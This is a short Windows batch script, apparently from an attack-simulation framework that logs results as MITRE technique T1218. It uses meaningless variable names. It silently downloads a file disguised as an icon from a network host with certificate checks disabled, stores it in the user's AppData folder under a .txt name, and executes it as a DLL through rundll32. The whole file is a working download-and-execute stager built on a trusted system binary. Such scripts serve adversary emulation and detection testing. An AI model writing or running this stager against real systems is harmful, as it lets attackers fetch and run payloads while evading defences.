@echo off
setlocal enabledelayedexpansion

SET kdjfow=BALAM-S2B
SET mznxla=10455
SET poqwir=7
SET douyiw=%APPDATA%\10455\bfe5de35
SET vnzmxk=9a3e44c8.txt
SET qpwoei=https://10.0.0.49/stage/2/icon.png?10455-7
SET xvtplq=%APPDATA%\7\macula-simulations.log

SET tsvar=!DATE!/!TIME!

SET log_file=%APPDATA%\!poqwir!\macula-simulations.log
if not exist "%APPDATA%\!poqwir!" mkdir "%APPDATA%\!poqwir!" >nul 2>&1

echo [!tsvar!][DEBUG][!kdjfow!][!mznxla!]: heartbeat_start>> "!xvtplq!" 2>nul

curl -k -s -o "!douyiw!\!vnzmxk!" "!qpwoei!"

echo [!tsvar!][DEBUG][!kdjfow!][!mznxla!]: heartbeat_complete>> "!xvtplq!" 2>nul

echo [!tsvar!][DEBUG][!kdjfow!][!mznxla!]: chdir_start>> "!xvtplq!" 2>nul

cd /d "!douyiw!" >nul 2>&1
SET chdir_rc=!ERRORLEVEL!

echo [!tsvar!][DEBUG][!kdjfow!][!mznxla!]: chdir_result=!chdir_rc!>> "!xvtplq!" 2>nul

echo [!tsvar!][DEBUG][!kdjfow!][!mznxla!]: rundll32_start>> "!xvtplq!" 2>nul

rundll32.exe !vnzmxk!, DllMain
SET lolbin_rc=!ERRORLEVEL!

echo [!tsvar!][DEBUG][!kdjfow!][!mznxla!]: dll_load_result=!lolbin_rc!>> "!xvtplq!" 2>nul

IF !lolbin_rc! EQU 0 (
    echo [!tsvar!][TTP][!kdjfow!][!mznxla!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!xvtplq!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!kdjfow!][!mznxla!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!xvtplq!" 2>nul
)

endlocal